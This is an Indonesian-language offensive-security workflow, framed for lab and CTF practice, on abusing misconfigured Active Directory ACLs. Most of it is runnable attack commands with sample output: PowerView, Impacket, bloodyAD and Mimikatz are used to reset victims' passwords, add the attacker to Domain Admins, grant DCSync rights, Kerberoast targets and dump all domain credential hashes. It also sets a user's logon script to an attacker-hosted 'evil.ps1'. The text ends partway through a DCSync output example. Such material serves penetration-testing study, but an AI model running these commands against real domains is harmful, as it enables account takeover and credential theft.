---
id: "38"
title: "🔐 File 38 — Active Directory ACL Abuse Workflow"
category: "4. Active Directory"
categoryId: "ad"
filename: "38_ad_acl_abuse_workflow.md"
refs_out: ["05","39","45"]
refs_in: ["35","36","37","39","40","42","43","65"]
---

# 🔐 File 38 — Active Directory ACL Abuse Workflow

> **Tujuan:** memahami bagaimana permission/ACL yang salah konfigurasi dapat menjadi jalur privilege escalation di Active Directory, khususnya setelah mendapatkan credentials dari workflow sebelumnya.
> 
> **Target latihan:** CTF, Hack The Box, TryHackMe, dan OSCP-style labs yang memang menyediakan environment untuk pengujian.
> 
> **Catatan penting:** command dan output di bawah ditulis untuk lab. Nama domain, username, IP, Distinguished Name (DN), dan password hanyalah contoh. Beberapa tool/versi dapat memiliki perbedaan sintaks; selalu cocokkan `--help`/dokumentasi versi tool yang terpasang.

---

## 🎯 0. Posisi File 38 dalam Workflow

File sebelumnya menghasilkan credentials melalui Kerberoasting / AS-REP Roasting.

Sekarang pertanyaan berubah:

> **“Dengan credentials yang sudah didapat, object Active Directory apa yang dapat saya kontrol melalui ACL?”**

ACL abuse bukan satu exploit tunggal. Ia lebih tepat dipahami sebagai **kemampuan kontrol** terhadap object.

### Alur mental

```
[CREDENTIALS BARU]
        │
        ▼
[IDENTITAS YANG SEKARANG KITA KONTROL]
        │
        ▼
[ENUMERATION ACL]
        │
        ├──► BloodHound
        ├──► PowerView
        ├──► dacledit
        └──► NetExec
        │
        ▼
[ADA OUTBOUND EDGE / CONTROL?]
        │
   ┌────┴────┐
   │         │
  YES        NO
   │         │
   ▼         ▼
[IDENTIFY   [Cari jalur
 ACE]        lain]
   │
   ▼
[PILIH ABUSE PRIMITIVE]
   │
   ├── GenericAll
   ├── GenericWrite
   ├── WriteOwner
   ├── WriteDACL
   ├── ForceChangePassword
   ├── AddMember
   ├── AllExtendedRights
   └── DCSync
   │
   ▼
[OBJEK TARGET]
   │
   ├── User
   ├── Group
   ├── Computer
   ├── GPO
   ├── OU
   └── Domain
   │
   ▼
[EXPLOIT]
   │
   ▼
[VALIDASI HASIL]
   │
   ▼
[NEXT HOP / PRIVILEGE ESCALATION]
```

### 🧠 Mindset utama

ACL tidak otomatis berarti target vulnerable.

Yang perlu dijawab adalah:

```
SIAPA?
  │
  ▼
Punya permission APA?
  │
  ▼
Ke OBJECT MANA?
  │
  ▼
Permission itu bisa menghasilkan CONTROL apa?
  │
  ▼
CONTROL tersebut mengarah ke mana?
```

---

# 🧩 BAGIAN 1 — KONSEP ACL DI ACTIVE DIRECTORY

## 1.1 🔎 Apa itu ACL, DACL, dan ACE?

Active Directory menggunakan Access Control List untuk menentukan siapa yang memiliki hak tertentu terhadap object.

Gunakan analogi sederhana:

```
OBJECT = Rumah

ACL = daftar aturan siapa boleh melakukan apa terhadap rumah

ACE = satu baris aturan

DACL = bagian dari ACL yang menentukan
       permission yang diberikan atau ditolak
```

### Definisi praktis

|Istilah|Arti sederhana|
|---|---|
|**ACL**|Access Control List, kumpulan aturan akses|
|**DACL**|Discretionary ACL, bagian yang menentukan permission|
|**ACE**|Access Control Entry, satu entri/aturan di dalam ACL|

Cara berpikir paling mudah:

```
"Siapa"
   │
   ▼
"Boleh melakukan apa"
   │
   ▼
"Ke object mana"
```

Contoh:

```
svc_web
   │
   ├── GenericWrite
   │
   ▼
alice
```

Artinya bukan sekadar:

> “svc_web bisa melihat alice.”

Tetapi:

> “svc_web memiliki jenis kontrol tertentu terhadap object alice.”

Jenis kontrol itulah yang harus dianalisis.

---

## 1.2 🗂️ Diagram DACL

Contoh sederhana pada user `alice`:

```
Object AD: User "alice"
      │
      ▼
    DACL
      │
      ├── ACE 1: "bob"           → GenericAll          → alice
      ├── ACE 2: "Domain Admins" → FullControl         → alice
      └── ACE 3: "svc_web"       → GenericWrite        → alice
```

Dari sudut pandang attacker:

```
[svc_web]
    │
    │ GenericWrite
    ▼
  [alice]
```

Pertanyaan berikutnya:

```
GenericWrite itu memungkinkan apa?
```

Inilah inti ACL enumeration.

---

## 1.3 ⚠️ Kenapa ACL Abuse Berbahaya?

Misconfiguration ACL dapat membuat account dengan privilege relatif rendah memiliki kontrol terhadap object yang jauh lebih penting.

Beberapa alasan:

### 1. Permission dapat tersembunyi

Administrator dapat merasa:

```
"SVC_SQL hanya service account biasa."
```

Namun ACL sebenarnya dapat memiliki:

```
SVC_SQL
   │
   └── GenericWrite → User/Admin Group/Computer
```

### 2. Satu permission dapat menjadi pivot

Contoh:

```
Low Priv User
    │
    │ GenericWrite
    ▼
Target User
    │
    │ group membership
    ▼
Privileged Group
```

Jadi:

```
ACL abuse
   ↓
object control
   ↓
privilege escalation
   ↓
lateral movement
   ↓
high-value target
```

### 3. Dapat dirantai

Single ACE sering tidak langsung memberikan Domain Admin.

Contoh:

```
svc_sql
   │
   │ GenericWrite
   ▼
alice
   │
   │ AddMember
   ▼
IT Admins
   │
   ▼
privileged access
```

### 4. UI standar tidak selalu membuat hubungan ini jelas

Relationship permission dapat lebih mudah dipahami melalui graph seperti BloodHound dibanding melihat object satu per satu di GUI.

### 5. Jangan menyimpulkan “tidak terlihat = tidak terdeteksi”

ACL abuse **bukan berarti tidak tercatat**.

Perubahan password, group membership, ACL, ownership, dan directory attributes dapat menghasilkan audit/security events tergantung konfigurasi domain.

---

## 1.4 🔥 ACE yang Paling Menarik bagi Attacker

> Severity di bawah adalah prioritas praktis untuk lab/assessment. Nilai sebenarnya bergantung pada **object target** dan jalur privilege escalation.

|ACE|Artinya|Apa yang bisa dilakukan attacker|Severity|
|---|---|---|---|
|**GenericAll**|Full control terhadap object|Mengubah banyak properti; pada user/group dapat menjadi takeover/privilege escalation|🔴 Critical|
|**GenericWrite**|Write ke sejumlah atribut|Memodifikasi atribut sensitif yang dapat membuka attack path|🔴 High|
|**WriteOwner**|Mengubah owner object|Setelah menjadi owner, attacker dapat berusaha mengubah DACL|🔴 High|
|**WriteDACL**|Mengubah DACL|Menambahkan ACE yang memberikan kontrol lebih tinggi|🔴 Critical|
|**ForceChangePassword**|Mengubah password tanpa password lama|Takeover account target melalui reset password|🔴 High|
|**AddMember / AddSelf**|Menambah anggota group|Memasukkan account ke group yang lebih privileged|🔴 Critical jika group sensitif|
|**AllExtendedRights**|Kumpulan extended rights tertentu|Bisa mencakup operasi sensitif, tergantung object/right yang tersedia|🔴 High|
|**ReadLAPSPassword**|Membaca password managed local admin|Dapat memberikan local administrator credential pada computer target|🔴 Critical|
|**GetChanges + GetChangesAll**|Replication-related rights|Dapat mengarah ke DCSync dan pengambilan credential material|🔴 Critical|
|**WriteAccountRestrictions**|Write restriction-related properties|Dapat membantu abuse tergantung attribute dan object target|🟠 Medium–High|
|**Self / AddSelf**|Melakukan aksi tertentu sebagai account sendiri|Sering relevan pada self-membership atau delegated rights tertentu|🟠 Variable|

> **Catatan:** Jika `ForceChangePassword` gagal, periksa apakah target berada dalam grup **Protected Users** yang mencegah perubahan password tanpa kredensial lama. Anda dapat memeriksa keanggotaan dengan:
```powershell
Get-DomainGroupMember -Identity "Protected Users"
```

### ⚠️ Jangan samakan semua ACE

Contoh:

```
GenericWrite → User
```

tidak sama dampaknya dengan:

```
GenericWrite → Domain
```

Demikian pula:

```
AddMember → Domain Users
```

sangat berbeda dengan:

```
AddMember → Domain Admins
```

**Object target adalah separuh dari analisis.**

---

## 1.5 🎯 Jenis Object yang Bisa Menjadi Target

### User object

Potential impact:

```
User
 │
 ├── password control
 ├── attribute modification
 ├── SPN-related abuse
 └── group/path pivot
```

Contoh:

```
GenericAll → alice
```

dapat menjadi jalur takeover account.

---

### Group object

Potential impact:

```
Group
 │
 └── membership control
          │
          ▼
     privileged group
```

Contoh:

```
AddMember → IT Admins
```

---

### Computer object

Potential impact:

```
Computer
   │
   └── delegated rights / RBCD-related path
```

Detail delegation dibahas pada:

```
[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation)
```

---

### GPO object

Potential impact:

```
GPO
 │
 └── policy modification
       │
       ▼
Code execution / configuration abuse
       │
       ▼
Affected computers/users
```

**Catatan:** dampak GPO sangat bergantung pada scope/linking dan permission terkait.

---

### Domain object

Potential impact:

```
Domain
   │
   └── replication rights
          │
          ▼
        DCSync
```

Domain-level rights adalah salah satu target paling berbahaya.

---

### OU object

Potential impact:

```
OU
 │
 └── inheritance / delegated permissions
            │
            ▼
       banyak object
```

Satu kesalahan di OU dapat memiliki efek jauh lebih luas dibanding satu user object.

---

# 🔍 BAGIAN 2 — ENUMERATION ACL

## 2.1 🧠 Filosofi Enumeration

Kesalahan umum pemula:

```
Scan semua ACL
      ↓
Kumpulkan ribuan hasil
      ↓
Tidak tahu mana yang penting
```

Lebih efektif:

```
START
  ↓
Account yang sekarang kita kontrol
  ↓
Outbound control
  ↓
Target object
  ↓
Interesting ACE
  ↓
Potential abuse
```

### Prinsip

1. Mulai dari account yang sudah dikuasai.
    
2. Gunakan BloodHound untuk visualisasi relationship.
    
3. Gunakan command-line/manual enumeration untuk verifikasi.
    
4. Prioritaskan high-value target.
    
5. Jangan berhenti pada satu edge; pikirkan multi-hop.
    

---

## 2.2 🩸 BloodHound — Cara Baca ACL dari Graph

BloodHound berguna karena ACL relationship lebih mudah dilihat sebagai graph.

### Query/analysis yang berguna

```
1. Find Shortest Path to Domain Admin
2. Find Principals with DCSync Rights
3. Find Dangerous Rights for Domain Users Group
4. Shortest Path to High Value Targets
5. Outbound object control dari account yang sekarang dikuasai
```

Contoh Cypher untuk conceptual ACL path:

```
# Cari relationship ACL tertentu dari account yang kita kontrol
# Catatan: nama relationship/label dapat berbeda antar versi BloodHound.
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteOwner|
WriteDACL|ForceChangePassword|AddMember]->
(t:User|Group|Computer|Domain)
WHERE u.name = "SVC_SQL@CORP.LOCAL"
RETURN p
```

### Cara membaca graph

```
[ACCOUNT DIKUASAI]
        │
        │ edge
        ▼
[TARGET OBJECT]
```

- Node high-value/critical target menunjukkan object yang bernilai tinggi.
    
- Edge label menunjukkan jenis relationship/control.
    
- Klik edge untuk melihat informasi relationship.
    
- Gunakan bagian help/abuse information yang tersedia pada versi BloodHound yang dipakai.
    
- Jangan menganggap edge sebagai bukti bahwa exploit pasti berhasil; lakukan manual verification.
    

### 🧠 Pertanyaan yang harus selalu ditanyakan

```
Saya punya edge apa?
        ↓
Edge itu terhadap object apa?
        ↓
Object itu siapa?
        ↓
Apa impact dari control ini?
        ↓
Apakah ada hop berikutnya?
```

---

## 2.3 🪟 PowerView — Manual ACL Enumeration

### IMPORT POWERVIEW

```
# Import PowerView ke session PowerShell
. .\PowerView.ps1
```

### CEK ACL UNTUK USER TERTENTU

```
# Siapa yang mempunyai rights menarik terhadap user "alice"?
Get-DomainObjectAcl -Identity "alice" -ResolveGUIDs |
  Where-Object {
    $_.ActiveDirectoryRights -match
    "GenericAll|GenericWrite|WriteOwner|WriteDACL|ForceChangePassword|ExtendedRight"
  } |
  Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType
```

### CEK ACL UNTUK GROUP

```
# Enumerate ACL pada group "Domain Admins"
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
  Where-Object {
    $_.ActiveDirectoryRights -ne "ReadProperty"
  } |
  Select-Object SecurityIdentifier,ActiveDirectoryRights
```

### ENUM SEMUA ACL UNTUK ACCOUNT YANG KITA KONTROL

```
# Cari object yang ACL-nya memberikan rights kepada svc_sql
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {
    $_.SecurityIdentifier -eq (Get-DomainUser svc_sql).objectsid
  } |
  Select-Object ObjectDN,ActiveDirectoryRights,ObjectAceType
```

### OUTBOUND CONTROL

```
# Cari domain ACL yang menarik dan filter berdasarkan account
Find-InterestingDomainAcl -ResolveGUIDs |
  Where-Object {
    $_.IdentityReferenceName -match "svc_sql"
  } |
  Select-Object ObjectDN,ActiveDirectoryRights,IdentityReferenceName
```

### Output realistis

```
ObjectDN                              ActiveDirectoryRights   ObjectAceType
--------                              ----------------------   ------------
CN=alice,CN=Users,DC=corp,DC=local    GenericWrite            User-Force-Change-Password
CN=IT Support,CN=Users,DC=corp,...    WriteProperty           Member
CN=WKSTN01,CN=Computers,DC=corp,...   GenericWrite            User-Account-Restrictions
```

### Cara berpikir

```
Output PowerView
      │
      ▼
Ada ACE menarik?
      │
   ┌──┴──┐
   │     │
 YES     NO
   │     │
   ▼     ▼
Identifikasi   Cari object
target          lain
   │
   ▼
Pilih abuse primitive
```

---

## 2.4 🐧 Linux — ldapsearch + dacledit

### Impacket dacledit

```
# Baca ACL dari object target
impacket-dacledit -action read \
  -target "alice" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

### Domain object

```
# Baca ACL domain object
impacket-dacledit -action read \
  -target-dn "DC=corp,DC=local" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

### Dengan NTLM hash

```
# Enumerate ACL menggunakan NTLM hash
impacket-dacledit -action read \
  -target "alice" \
  -dc-ip $DC_IP \
  -hashes :$NTLM_HASH \
  "$DOMAIN/$USERNAME"
```

### `ldapsearch` dasar

```
# Query object computer dari LDAP
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(objectClass=computer)" \
  distinguishedName \
  sAMAccountName
```

### Contoh output `dacledit`

> Output dapat berbeda antar versi Impacket. Contoh berikut bersifat representatif untuk pola informasi yang ingin dicari.

```
[*] Parsing DACL
[*] Object: CN=alice,CN=Users,DC=corp,DC=local

ACE[0]:
  Type: ACCESS_ALLOWED_ACE
  Principal: CORP\SVC_SQL
  Rights: GENERIC_WRITE
  ObjectAceType: User-Account-Restrictions

ACE[1]:
  Type: ACCESS_ALLOWED_ACE
  Principal: CORP\Domain Admins
  Rights: FULL_CONTROL
  ObjectAceType: All
```

> **Contoh output ketika tidak ada ACE menarik:**
```
[*] Parsing DACL
[*] No interesting ACEs found for
    principal CORP\\SVC_SQL
```

### 🧠 Apa yang dicari?

```
Principal = account kita?
            │
            ▼
Rights menarik?
            │
            ▼
Target object bernilai?
            │
            ▼
Potential attack path?
```

---

## 2.5 🛠️ NetExec ACL Enumeration

### BloodHound collection

```
# Collect LDAP/BloodHound-related information
# Sesuaikan collector/collection method dengan versi NetExec yang terpasang.
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD \
  --bloodhound -ns $DC_IP -c All
```

### gMSA

```
# Cek apakah credentials gMSA dapat dibaca oleh account kita
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD --gmsa
```

### LAPS

```
# Cek apakah account kita dapat membaca LAPS-managed local admin password
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD -M laps
```

---

# ⚔️ BAGIAN 3 — EKSPLOITASI PER JENIS ACE

> **Lab note:** langkah-langkah berikut dimaksudkan untuk environment yang Anda berwenang menguji.

---

## 3.1 🔴 GenericAll

### a) Apa artinya?

`GenericAll` secara konseptual berarti **full control terhadap object** yang terkena ACE.

Namun “full control” harus selalu dibaca bersama target object.

```
GenericAll
   │
   ├── User     → account takeover / attribute abuse
   ├── Group    → membership control
   ├── Computer → potential delegation-related abuse
   └── lainnya  → impact tergantung object
```

### b) Kapan ditemukan?

Contoh:

```
SVC_SQL
   │
   │ GenericAll
   ▼
alice
```

atau:

```
SVC_SQL
   │
   │ GenericAll
   ▼
Domain Admins
```

### c) Attack — Target USER

#### Linux

```
# Reset password target user dari Linux.
# Gunakan hanya pada lab yang memang memberikan delegated password-control.
net rpc password "alice" "NewPassword123!" \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP
```

Alternatif:

```
# Alternatif change/reset password melalui Impacket.
impacket-changepasswd \
  "$DOMAIN/alice:NewPassword123!@$DC_IP" \
  -altuser $USERNAME \
  -altpass $PASSWORD \
  -newpass 'NewPassword123!'
```

Targeted SPN path:

```
# Menambahkan SPN ke target user jika rights dan kondisi target mendukung.
# Tujuan: membuat target user menjadi service principal yang dapat diuji
# untuk Kerberoasting.
impacket-addspn -u "$DOMAIN/$USERNAME" \
  -p "$PASSWORD" \
  -s "http/fake" \
  -t "alice" \
  $DC_IP
```

Lalu lakukan workflow Kerberoasting yang sudah dipelajari.

#### Windows

```
# Reset password target user
$NewPassword = ConvertTo-SecureString 'NewPassword123!' `
  -AsPlainText -Force

Set-DomainUserPassword -Identity alice `
  -AccountPassword $NewPassword
```

Targeted SPN:

```
# Tambahkan SPN ke target bila attribute write diizinkan
Set-DomainObject -Identity alice `
  -Set @{serviceprincipalname='http/fake'}

# Kerberoast SPN tersebut
Get-DomainSPNTicket -SPN "http/fake"
```

### d) Contoh output

```
[+] Password was changed successfully.
[*] Target: alice
[*] New password set.
```

### e) Setelah exploit berhasil

```
GenericAll → alice
       │
       ▼
Account Control
       │
       ├── Login as alice
       ├── Enumerate alice's groups
       ├── Check ACL outbound dari alice
       └── Continue next hop
```

### f) Decision tree

```
[GenericAll]
     │
     ▼
[Target type?]
 ┌───┼──────────┐
 │   │          │
User Group   Computer
 │   │          │
 ▼   ▼          ▼
Takeover  AddMember   RBCD/delegation
 │
 ▼
Re-enumerate
```

---

### 3.1.1 👥 GenericAll → GROUP

#### Linux

```
# Tambahkan account kita ke group target
net rpc group addmem "Domain Admins" $USERNAME \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP
```

#### Windows

```
# Tambahkan account kita ke group
Add-DomainGroupMember -Identity "Domain Admins" `
  -Members $USERNAME
```

### Output realistis

```
Added user SVC_SQL to Domain Admins.
```

### Next step

```
AddMember
   ↓
Membership berubah
   ↓
Refresh token/session
   ↓
Test authorization
   ↓
Enumerate new privilege
```

> Dalam lab, bila perubahan membership belum terlihat pada access token, lakukan logoff/logon atau buat session baru.

---

### 3.1.2 💻 GenericAll → COMPUTER

GenericAll terhadap computer dapat menjadi indikator jalur menuju delegation abuse, termasuk RBCD pada kondisi tertentu.

```
GenericAll → Computer
       │
       ▼
Object control
       │
       ▼
Delegation-related attack path
       │
       ▼
RBCD
```

Detail RBCD diarahkan ke:

```
[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation)
```

---

## 3.2 🟠 GenericWrite

### a) Apa artinya?

`GenericWrite` berarti account memiliki kemampuan menulis sejumlah atribut pada object, tetapi tidak identik dengan full control.

Kesalahan umum:

```
GenericWrite = GenericAll
```

Itu tidak benar.

Pertanyaan yang benar:

```
GenericWrite
   ↓
Atribut apa yang dapat ditulis?
   ↓
Atribut tersebut bisa disalahgunakan untuk apa?
```

### b) Kondisi umum

```
svc_web
   │
   │ GenericWrite
   ▼
alice
```

### c) Attack — TARGET USER

#### Targeted Kerberoast

```
# Setelah memastikan permission mendukung perubahan SPN,
# gunakan tool/versi yang sesuai untuk menambahkan SPN ke target.
# Contoh pola:
impacket-addspn -u "$DOMAIN/$USERNAME" \
  -p "$PASSWORD" \
  -s "http/fake" \
  -t "alice" \
  $DC_IP
```

#### Targeted AS-REP roasting path

```
# Versi baru bloodyAD (bukan impacket-bloodyad)
# Verifikasi versi yang terinstall:
# bloodyAD --help

bloodyAD -u $USERNAME -p $PASSWORD \
  -d $DOMAIN --host $DC_IP \
  set object alice userAccountControl \
  -v 4259840
```

> `4259840` adalah contoh kombinasi flag tertentu (`UF_NORMAL_ACCOUNT | UF_DONT_REQUIRE_PREAUTH`) pada skenario lab; verifikasi nilai/attribute sebelum menggunakannya.

#### Windows

```
# Set SPN pada target
Set-DomainObject -Identity alice `
  -Set @{serviceprincipalname='http/fake'}

# Lakukan pengambilan ticket pada SPN tersebut
Get-DomainSPNTicket -SPN "http/fake"
```

Potential script path:

```
# Menulis scriptPath pada skenario lab yang memang membuat
# attribute ini relevan terhadap eksekusi.
Set-DomainObject -Identity alice `
  -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

### d) Target GROUP

```
# Jika GenericWrite menghasilkan kontrol yang memungkinkan perubahan
# membership pada group target:
Add-DomainGroupMember -Identity "IT Admins" `
  -Members $USERNAME
```

### e) Target COMPUTER

```
GenericWrite → Computer
       │
       ▼
Potential computer-object abuse
       │
       ▼
RBCD / delegation workflow
       │
       ▼
[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation)
```

### f) Decision tree

```
[GenericWrite]
      │
      ▼
[Target object]
  ┌───┼───────┐
  │   │       │
 User Group Computer
  │   │       │
  ▼   ▼       ▼
SPN/attrs  membership  delegation path
  │
  ▼
Re-enumerate
```

---

## 3.3 🔵 WriteOwner

### a) Apa artinya?

`WriteOwner` berarti account dapat mengubah **owner** object.

Owner bukan otomatis sama dengan:

```
FullControl
```

Tetapi ownership dapat menjadi batu loncatan untuk mengendalikan security descriptor/DACL sesuai permission dan kondisi object.

### b) Model serangan

```
WriteOwner pada alice
        │
        ▼
Ubah owner alice → kita
        │
        ▼
Dengan ownership yang diperoleh,
coba kontrol DACL
        │
        ▼
Tambahkan ACE yang relevan
        │
        ▼
Abuse permission baru
```

### c) Linux

```
# Ubah owner object menjadi account kita
impacket-owneredit \
  -action write \
  -new-owner $USERNAME \
  -target "alice" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

Kemudian:

```
# Setelah memperoleh ownership, tambahkan FullControl ke account kita
# bila DACL manipulation pada target diperbolehkan.
impacket-dacledit \
  -action write \
  -rights FullControl \
  -principal $USERNAME \
  -target "alice" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

Lalu:

```
# Gunakan permission baru untuk reset password target
net rpc password "alice" "NewPassword123!" \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP
```

### d) Windows

```
# Ubah owner object
Set-DomainObjectOwner -Identity alice `
  -OwnerIdentity $USERNAME
```

```
# Tambahkan FullControl ke account kita
Add-DomainObjectAcl -TargetIdentity alice `
  -PrincipalIdentity $USERNAME `
  -Rights All
```

```
# Setelah rights berubah, reset password target
$NewPassword = ConvertTo-SecureString 'NewPassword123!' `
  -AsPlainText -Force

Set-DomainUserPassword -Identity alice `
  -AccountPassword $NewPassword
```

### e) Contoh output

```
[*] Owner changed successfully
[*] Added ACE for CORP\SVC_SQL
[*] Rights: FullControl
[+] Password changed successfully
```

### f) Decision tree

```
[WriteOwner]
     │
     ▼
[Can change owner?]
     │
     ▼
[Become owner]
     │
     ▼
[Can modify DACL?]
     │
   ┌─┴─┐
  YES  NO
   │    │
   ▼    ▼
Add ACE  Find another path
   │
   ▼
Exploit new rights
```

---

## 3.4 🟣 WriteDACL

### a) Apa artinya?

`WriteDACL` berarti account dapat memodifikasi DACL object.

Ini sangat kuat karena attacker dapat menambahkan ACE baru yang memberi control tambahan kepada dirinya sendiri.

### b) Linux

```
# Tambahkan FullControl untuk account kita
impacket-dacledit \
  -action write \
  -rights FullControl \
  -principal $USERNAME \
  -target "alice" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

Domain-level example:

```
# Jika WriteDACL memang berada pada domain object,
# tambahkan replication-related rights melalui metode tool yang sesuai.
impacket-dacledit \
  -action write \
  -rights DCSync \
  -principal $USERNAME \
  -target-dn "DC=corp,DC=local" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

### c) Windows

```
# Tambahkan FullControl ke diri sendiri
Add-DomainObjectAcl `
  -TargetIdentity alice `
  -PrincipalIdentity $USERNAME `
  -Rights All
```

DCSync:

```
# Tambahkan replication/DCSync rights ke account
# hanya jika domain object memang targetnya.
Add-DomainObjectAcl `
  -TargetIdentity "DC=corp,DC=local" `
  -PrincipalIdentity $USERNAME `
  -Rights DCSync
```

### d) Logika

```
WriteDACL
   │
   ▼
Kita boleh mengubah DACL
   │
   ▼
Tambahkan ACE baru
   │
   ├── FullControl
   ├── ForceChangePassword
   ├── replication rights
   └── rights lain yang relevan
   │
   ▼
Gunakan privilege baru
```

### e) Decision tree

```
[WriteDACL]
    │
    ▼
[Target?]
    │
    ├── User → add control → account takeover
    │
    ├── Group → add membership rights
    │
    └── Domain → replication rights → DCSync
```

---

## 3.5 🔑 ForceChangePassword

### a) Apa artinya?

`ForceChangePassword` berarti account yang memiliki right tersebut dapat mereset password object target tanpa perlu mengetahui password lama.

Ini berbeda dari:

```
"mengganti password sendiri"
```

dan harus dipahami sebagai:

```
"account A diberi kemampuan untuk mengontrol
password account B."
```

### b) Mengapa berbahaya?

Karena attacker tidak memerlukan:

```
old password
```

Untuk memperoleh kontrol.

### c) Linux

```
# Reset password target user
net rpc password "alice" "NewPassword123!" \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP
```

Alternatif:

```
# Reset password dengan Impacket
impacket-changepasswd \
  "$DOMAIN/alice@$DC_IP" \
  -newpass 'NewPassword123!' \
  -altuser "$DOMAIN/$USERNAME" \
  -altpass "$PASSWORD" \
  -no-pass
```

### d) Windows

```
# Siapkan password baru
$NewPassword = ConvertTo-SecureString 'NewPassword123!' `
  -AsPlainText -Force

# Reset password target
Set-DomainUserPassword -Identity alice `
  -AccountPassword $NewPassword
```

Native AD module:

```
# Reset password dengan ActiveDirectory module
Set-ADAccountPassword -Identity alice `
  -NewPassword $NewPassword `
  -Reset
```

### e) Output realistis

```
[*] Attempting password reset for alice
[+] Password reset succeeded
```

### f) Risiko praktis

```
ForceChangePassword
       │
       ▼
Password target berubah
       │
       ▼
Target bisa gagal login
       │
       ▼
User/admin mungkin menyadari perubahan
```

### g) OPSEC / cleanup

```
[Reset password]
      │
      ├── Gunakan credential secukupnya
      ├── Catat perubahan
      └── Pada lab, kembalikan state bila diperlukan
```

### h) Decision tree

```
[ForceChangePassword]
        │
        ▼
[Target user?]
        │
        ▼
Reset password
        │
        ▼
Login / test access
        │
        ▼
Enumerate next privileges
```

---

## 3.6 👥 AddMember / AddSelf

### a) Apa artinya?

`AddMember` berarti account dapat menambahkan principal ke group.

Dari sudut attacker:

```
[Control group]
      │
      ▼
[Can add self]
      │
      ▼
[Become group member]
      │
      ▼
[Inherit group's permissions]
```

### b) Linux

```
# Tambahkan account kita ke "IT Support"
net rpc group addmem "IT Support" $USERNAME \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP
```

BloodyAD:

```
# Tambahkan member menggunakan bloodyAD
impacket-bloodyad \
  -u $USERNAME -p $PASSWORD \
  -d $DOMAIN --host $DC_IP \
  add groupMember "IT Support" $USERNAME
```

### c) Windows

```
# Tambahkan diri ke group target
Add-DomainGroupMember `
  -Identity "IT Support" `
  -Members $USERNAME
```

Verifikasi:

```
# Verifikasi membership
Get-DomainGroupMember -Identity "IT Support"
```

### d) Contoh output

```
Group: IT Support
Members:
  CORP\SVC_SQL
  CORP\alice
```

### e) Setelah berhasil

```
AddMember
   │
   ▼
Membership berubah
   │
   ▼
Session/token mungkin belum refresh
   │
   ▼
Logoff/logon atau session baru
   │
   ▼
Enumerate privileges baru
```

### f) Decision tree

```
[AddMember]
     │
     ▼
[Group target?]
     │
     ├── Low-value group
     │       ↓
     │    Cari edge berikutnya
     │
     └── Privileged group
             ↓
         Refresh token
             ↓
        Validate access
```

---

## 3.7 🟡 AllExtendedRights

### a) Apa artinya?

`AllExtendedRights` menunjukkan kontrol terhadap extended rights yang tersedia pada object tertentu.

Jangan mengartikan ini secara membabi buta sebagai:

```
"semua kemungkinan privilege terhadap semua object."
```

Dampaknya tergantung:

```
Object
+
Extended right
+
Attribute protection
+
Environment
```

Contoh rights yang sering relevan dalam pembahasan ACL abuse:

```
ForceChangePassword
LAPS-related read permission
```

### b) Linux — LAPS

```
# Cek LAPS melalui NetExec
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD -M laps
```

LDAP query:

```
# Query attribute LAPS klasik pada computer object
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(objectClass=computer)" \
  ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime
```

### c) Windows

```
# Contoh membaca attribute LAPS klasik
Get-DomainComputer -Properties ms-mcs-admpwd |
  Select-Object name,ms-mcs-admpwd
```

> **Catatan:** lingkungan modern dapat menggunakan Windows LAPS dengan attribute/schema yang berbeda dari legacy Microsoft LAPS. Selalu identifikasi jenis LAPS lebih dulu.

### d) Decision tree

```
[AllExtendedRights]
        │
        ▼
[Object type?]
        │
   ┌────┴────┐
   │         │
Computer    User
   │         │
   ▼         ▼
Check LAPS   Check password-related
   │         rights
   └────┬────┘
        ▼
Validate exact right
        │
        ▼
Exploit only what is granted
```

---

## 3.8 💥 DCSync — GetChanges + GetChangesAll

### a) Apa artinya?

DCSync memanfaatkan replication privileges terhadap domain.

Dari sudut attacker:

```
Replication rights
      │
      ▼
Minta data credential tertentu dari DC
      │
      ▼
Credential material
```

Ini merupakan salah satu ACL abuse path yang paling kritis.

### b) Linux — Impacket

Dump seluruh domain:

```
# DCSync seluruh credential material yang dapat direplikasi
impacket-secretsdump \
  "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
  -just-dc
```

Target satu user:

```
# Ambil credential material user tertentu
impacket-secretsdump \
  "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
  -just-dc-user Administrator
```

Dengan NTLM hash:

```
# Pass-the-hash authentication
impacket-secretsdump \
  -hashes :$NTLM_HASH \
  "$DOMAIN/$USERNAME@$DC_IP" \
  -just-dc
```

### c) Windows — Mimikatz

```
# DCSync satu user tertentu
lsadump::dcsync /domain:corp.local /user:Administrator
```

```
# DCSync semua user yang dapat diambil
lsadump::dcsync /domain:corp.local /all /csv
```

### d) Contoh output realistis

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
